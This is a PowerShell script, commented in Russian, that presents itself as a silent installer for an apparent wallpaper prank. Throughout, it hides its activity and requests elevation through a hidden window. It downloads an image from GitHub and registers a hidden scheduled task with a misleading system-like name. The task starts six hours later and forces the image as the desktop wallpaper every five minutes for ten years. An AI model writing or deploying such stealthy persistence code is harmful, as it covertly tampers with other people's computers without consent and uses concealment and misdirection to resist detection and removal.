# installer.ps1
# Silent installer: try to elevate; if elevation not granted -> fallback to non-admin install
$ErrorActionPreference = "SilentlyContinue"
[void][System.Reflection.Assembly]::LoadWithPartialName("System.IO.Compression.FileSystem")

# Настройки
$WallpaperUrl = "https://raw.githubusercontent.com/servavox/wallpaper-prank/refs/heads/main/61o07gshhmga1.png"
$WallpaperName = "wall.png"
$TaskNameAdmin = "SystemWallpaperUpdater"
$TaskNameUser = "UserWallpaperUpdater"

function Is-Administrator {
    $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
    $p = New-Object System.Security.Principal.WindowsPrincipal($id)
    return $p.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
}

# Если запущено без параметра -Elevated и не админ, пробуем перезапустить с UAC
param([switch]$Elevated)
if (-not $Elevated -and -not (Is-Administrator)) {
    try {
        Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -Elevated" -Verb RunAs -WindowStyle Hidden -ErrorAction Stop
        # если пользователь подтвердил, новый процесс выполнит установку — завершаем текущий
        exit
    } catch {
        # Если пользователь отказал или произошла ошибка — продолжим без админа
    }
}

# Выбор целевой папки в зависимости от прав
if (Is-Administrator) {
    $InstallRoot = "C:\ProgramData\SystemData\WPEngine"
} else {
    $InstallRoot = Join-Path $env:LOCALAPPDATA "WPEngine"
}
New-Item -ItemType Directory -Force -Path $InstallRoot | Out-Null

# Скачиваем картинку
$targetWallpaper = Join-Path $InstallRoot $WallpaperName
try { Invoke-WebRequest -Uri $WallpaperUrl -OutFile $targetWallpaper -UseBasicParsing -ErrorAction Stop | Out-Null } catch { }

# Создаём тихий скрипт смены обоев
$wallScriptPath = Join-Path $InstallRoot "wallpaper.ps1"
$wallScriptContent = @"
`$ErrorActionPreference = 'SilentlyContinue'
`$selected = '$targetWallpaper'
Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name Wallpaper -Value `$selected
Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name WallpaperStyle -Value '10'
Set-ItemProperty -Path 'HKCU:\Control Panel\Desktop' -Name TileWallpaper -Value '0'
Add-Type @'
using System;
using System.Runtime.InteropServices;
public class NativeMethods {
    [DllImport("user32.dll",SetLastError=true)]
    public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
'@
[NativeMethods]::SystemParametersInfo(20, 0, `$selected, 0x01 -bor 0x02) | Out-Null
exit
"@
$wallScriptContent | Out-File -FilePath $wallScriptPath -Encoding UTF8

# Установим права на скрипт (без вывода)
try { icacls $wallScriptPath /grant "$($env:USERNAME):(R,X)" | Out-Null } catch { }

# Создание задачи: если админ — используем Register-ScheduledTask (скрытая задача),
# иначе используем schtasks для текущего пользователя.
if (Is-Administrator) {
    try {
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$wallScriptPath`""
        $startTime = (Get-Date).AddHours(6)
        $trigger = New-ScheduledTaskTrigger -Once -At $startTime -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 3650)
        $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive -RunLevel LeastPrivilege
        $settings = New-ScheduledTaskSettingsSet -Hidden $true -AllowStartIfOnBatteries $true -DontStopOnIdleEnd $true

        if (Get-ScheduledTask -TaskName $TaskNameAdmin -ErrorAction SilentlyContinue) {
            Unregister-ScheduledTask -TaskName $TaskNameAdmin -Confirm:$false | Out-Null
        }
        Register-ScheduledTask -TaskName $TaskNameAdmin -Action $action -Trigger $trigger -Principal $principal -Settings $settings | Out-Null
    } catch {
        # если что-то пошло не так — упадём в fallback ниже
    }
}

# Если задача админа не создана (или мы не админ) — создаём задачу для пользователя через schtasks
if (-not (Get-ScheduledTask -TaskName $TaskNameAdmin -ErrorAction SilentlyContinue)) {
    # Время старта +6 часов, формат HH:mm
    $startTimeUser = (Get-Date).AddHours(6).ToString("HH:mm")
    # Команда запуска (PowerShell скрыто)
    $taskAction = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$wallScriptPath`""
    # Создаём/перезаписываем задачу (каждые 5 минут)
    $schtasksCmd = "schtasks /Create /SC MINUTE /MO 5 /TN `"$TaskNameUser`" /TR `"$taskAction`" /ST $startTimeUser /F /RL LIMITED"
    try {
        cmd.exe /c $schtasksCmd | Out-Null
    } catch { }
}

# конец (ничего не выводим)
exit
